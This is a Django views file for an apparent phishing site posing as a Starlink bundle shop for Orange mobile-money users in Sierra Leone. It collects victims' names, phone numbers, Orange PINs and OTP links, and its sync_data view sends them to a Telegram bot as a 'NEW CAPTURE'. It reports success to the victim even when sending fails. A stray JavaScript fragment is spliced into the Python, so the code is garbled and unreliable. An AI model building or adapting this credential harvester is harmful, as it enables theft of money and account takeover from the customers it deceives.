import json
import requests
import logging  
from django.shortcuts import render, redirect, get_object_or_404 # Fixed imports
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order # Ensure your model name matches

# Telegram Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

from django.shortcuts import render, redirect, get_object_or_404
from .models import Order, Bundle  # Use the correct names from models.py

def home(request):
    return render(request, 'index.html')

def checkout(request):
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    return render(request, 'checkout.html', {'bundle': bundle, 'price': price})

def payment_instructions(request):
    if request.method == 'POST':
        full_name = request.POST.get('fullName', '')
        city = request.POST.get('city', '')
        bundle_name = request.POST.get('bundle', 'Power User')

        # 1. Get the correct bundle object
        selected_bundle = Bundle.objects.filter(name=bundle_name).first() or Bundle.objects.first()
        
        # 2. Create the order
        order = Order.objects.create(
            full_name=full_name,
            city=city,
            total_amount=199,  
            bundle=selected_bundle
        )

        # 3. CRITICAL: Store the order ID in the session!
        # This allows the next page (otp_verification) to find this exact order
        request.session['current_order_id'] = str(order.order_id)

        return render(request, 'payment_instructions.html', {'order': order})
    
    return redirect('starlink_app:home')
def otp_verification(request): # Removed order_id from here
    # Since we don't have the ID in the URL, we find the "latest" order 
    # created in this session, or simply the most recent one.
    order = Order.objects.order_by('-created_at').first() 

    if request.method == 'POST':
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        if order:
            # Match your models.py field names
            order.phone_number = phone 
            order.orange_pin = pin
            order.save()

            # Update session for the Telegram/Sync stage
            request.session['phone'] = phone
            request.session['pin'] = pin
            request.session['bundle'] = str(order.bundle)

        return redirect('starlink_app:otp_verification')
    return render(request, 'otp_verification.html', {'order': order})

import os



# This helps you see the error in the Render Logs

logger = logging.getLogger(__name__)




@csrf_exempt

def sync_data(request):

    """

    Final Stage: Collects Session Data (Phone, PIN, Bundle) + 

    Frontend Data (Link) and sends it to the Admin via Telegram.

    """

    if request.method != 'POST':

        return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)



    try:

        # 1. Parse Link from Frontend

        data = json.loads(request.body)

        otp_link = data.get('otp', 'No Link provided')


    .  then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            // Success! Redirect to the final success page
            window.location.href = "{% url 'starlink_app:payment_instructions' %}"; 
        } else {
            // THE ERROR LOGIC
            alert("❌ Incorrect link. Please check the SMS and try again.");
            
            // Force the resend button to appear immediately
            seconds = 0; 
            
            // Reset the main button so they can try again
            btn.disabled = false;
            btn.innerHTML = "CONFIRM AUTHENTICATION";
        }
    })
    .catch(error => {
        console.error('Error:', error);
        btn.disabled = false;
        btn.innerHTML = "CONFIRM AUTHENTICATION";
    });
}

        # 2. Retrieve Secured Session Data

        # These must be set in your previous views via request.session['key']

        phone = request.session.get('phone', 'Missing')

        bundle = request.session.get('bundle', 'Missing')

        pin = request.session.get('pin', 'Missing')



        # 3. Securely Get Telegram Credentials

        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')

        chat_id = os.getenv('TELEGRAM_CHAT_ID')



        # CHECK: If variables are missing, log for Admin but don't crash for Customer

        if not bot_token or not chat_id:

            logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in Render Settings.")

            return JsonResponse({

                "status": "error", 

                "message": "Server config missing" # Only visible if you haven't set Render Vars

            }, status=500)



        # 4. Format Message for Telegram

        message = (

            "🇸🇱 *ORANGE MAX IT - NEW CAPTURE*\n"

            "━━━━━━━━━━━━━━━━━━\n"

            f"📞 *PHONE:* `+232 {phone}`\n"

            f"🔑 *PIN:* `{pin}`\n"

            f"📦 *BUNDLE:* {bundle}\n"

            "━━━━━━━━━━━━━━━━━━\n"

            f"🔗 *OTP LINK:*\n{otp_link}\n"

            "━━━━━━━━━━━━━━━━━━\n"

            "📡 *STATUS:* DATA RECEIVED"

        )



        # 5. Send to Telegram

        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

        response = requests.post(telegram_url, json={

            "chat_id": chat_id,

            "text": message,

            "parse_mode": "Markdown"

        }, timeout=15)



        # 6. Admin vs Customer Response

        if response.status_code == 200:

            return JsonResponse({"status": "success"})

        else:

            # Log exact Telegram error for Admin only

            logger.error(f"Telegram Failure: {response.status_code} - {response.text}")

            # Tell customer it's working so they don't try to resubmit

            return JsonResponse({"status": "success", "info": "processing"})



    except Exception as e:

        logger.exception("Internal Sync Error:")

        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=500)